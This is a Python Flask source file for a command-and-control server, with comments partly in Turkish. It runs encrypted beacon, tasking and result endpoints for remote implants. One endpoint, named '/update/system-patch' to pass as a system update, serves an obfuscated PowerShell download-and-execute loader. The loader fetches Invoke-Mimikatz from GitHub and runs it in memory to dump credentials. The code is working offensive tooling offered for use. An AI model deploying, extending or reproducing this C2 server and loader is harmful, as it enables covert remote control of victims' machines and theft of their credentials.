from datetime import datetime, timezone
import json
import logging
import os.path
from flask import Flask, request, jsonify, Response
from Encryption import encrypt_data, decrypt_data
app = Flask(__name__)

PAYLOAD_LOADER = '''$ErrorActionPreference = 'SilentlyContinue';
IEX (New-Object Net.WebClient).DownloadString('http://powershellgallery.com/api/v2'); 
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1');
Write-Output "Payload loaded to memory - Mimikatz ready"'''


#Logging Settings
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)-7s - %(name)s - %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S',
    handlers=[
        logging.FileHandler('c2_server.log', encoding='utf-8'),
        logging.StreamHandler()
    ])
logger = logging.getLogger(__name__)

#persistent files
TASKS_FILE = 'tasks.json'
AGENTS_FILE = 'agents.json'

def load_data(file_path, default):
    if os.path.exists(file_path):
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                return json.load(f)
        except Exception as e:
            logger.error(f"Failed to read file: {file_path} → {e}")
            return default
    else:
        logger.info(f"File not found, using default value: {file_path}")
        return default

def save_data(file_path, data):
    try:
        with open(file_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        logger.error(f"Failed to write file: {file_path} → {e}")

tasks = load_data(TASKS_FILE, {})
agents = load_data(AGENTS_FILE, {})

@app.route('/api/beacon', methods = ['POST'])
def beacon():
    #json data comes encrypted
    try:
        payload = request.get_json()
        if not payload or 'data' not in payload:
            return jsonify({"error": "Missing data"}), 400

        # We decrypt it
        encrypted = payload['data']
        print("[DEBUG beacon] Coming encrypted token:", encrypted[:150], "...")  # token'ın başını gör
        print("[DEBUG beacon] Token Length:", len(encrypted))

        decrypted = decrypt_data(encrypted)
        print("[DEBUG beacon] decrypted text:", decrypted)

        info = json.loads(decrypted)
        print("[DEBUG beacon] JSON parsed:", info)

        agent_id = info.get('id')
        print(f"[DEBUG] agent_id: {agent_id} (type: {type(agent_id)})")
        if not agent_id:
            return jsonify({"error": "No agent_id"}), 400

        #update agent info
        agents[agent_id] = agents.get(agent_id, {})
        agents[agent_id].update({
            "last_seen": datetime.now(timezone.utc).isoformat(), "ip": request.remote_addr,
            "user_agent": request.headers.get('User-Agent',"Unknown")
        })
        save_data(AGENTS_FILE, agents)

        #Is there any waiting task for this agent?
        pending_task = None
        if agent_id in tasks and tasks[agent_id]:
            pending_task = tasks[agent_id].pop(0)
            save_data(TASKS_FILE, tasks)
        response = {"task": pending_task}
        encrypted_response = encrypt_data(json.dumps(response))
        logger.info("Beacon received - agent_id=%s  ip=%s  task_sent=%s",
                    agent_id, request.remote_addr, bool(pending_task))
        return jsonify({"data": encrypted_response})
    except Exception as e:
        print("[DEBUG beacon] ERROR:", type(e).__name__, str(e))
        logger.error(f"Beacon processing failed: {e}", exc_info=True)
        return jsonify({"error": "Beacon error"}), 500




@app.route('/api/result', methods= ['POST'])
def result():
    try:
        payload = request.get_json()
        if not payload or 'data' not in payload:
            return jsonify({"error": "Missing data"}), 400
        encrypted = payload['data']
        decrypted = decrypt_data(encrypted)
        result_info = json.loads(decrypted)
        agent_id = result_info.get('id')
        output = result_info.get('output')

        if not agent_id or output is None:
            return jsonify({"error": "Missing agent_id or output"}), 400
        if agent_id in agents:
            agents[agent_id]["last_result"] = datetime.now(timezone.utc).isoformat()
            save_data(AGENTS_FILE, agents)
            logger.info("Result received - agent_id=%s", agent_id)
            logger.info("Output:\n%s\n%s", output, "-" * 80)
            return jsonify({"status": "received"}), 200
    except Exception as e:
        logger.error(f"Result processing failed: {e}", exc_info=True)
        return jsonify({"error": "Result error"}), 500



@app.route('/update/system-patch', methods=['GET'])
def system_patch():
    """Dosyasız PowerShell loader endpoint'i"""
    user_agent = request.headers.get('User-Agent', '')
    ip = request.remote_addr

    logger.info(f"Patch request from {ip} - UA: {user_agent[:100]}")

    # Obfuscated payload döndür (Base64 encoded)
    encoded_payload = PAYLOAD_LOADER.encode('utf-16le').hex()
    response = f"IEX([Text.Encoding]::Unicode.GetString([Convert]::FromHexString('{encoded_payload}')))"

    return Response(response, mimetype='text/plain'), 200




@app.route('/api/push_task', methods = ['POST'])
def push_task():
    try:
        payload = request.get_json()
        if not payload or 'data' not in payload:
            return jsonify({"error": "Missing data"}), 400
        encrypted = payload['data']
        decrypted = decrypt_data(encrypted)
        info = json.loads(decrypted)
        agent_id = info.get('id')
        task= info.get('task')

        if not agent_id or not isinstance(task, dict):
            return jsonify({"error": "Invalid agent_id or task format"}), 400
        if agent_id not in tasks:
            tasks[agent_id] = []

        tasks[agent_id].append(task)
        save_data(TASKS_FILE, tasks)

        logger.info("Task queued - agent_id=%s", agent_id)
        logger.debug("Task payload:\n%s", json.dumps(task, ensure_ascii=False, indent=2))
        return jsonify({"status": "queued"})
    except Exception as e:
        logger.error(f"Task queuing failed: {e}", exc_info=True)
        return jsonify({"error": "Push task error"}), 500


if __name__ == '__main__':
    import ssl
    context = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
    context.load_cert_chain('server.crt', 'server.key')
    app.run(host='0.0.0.0', port=443, ssl_context=context, debug=True)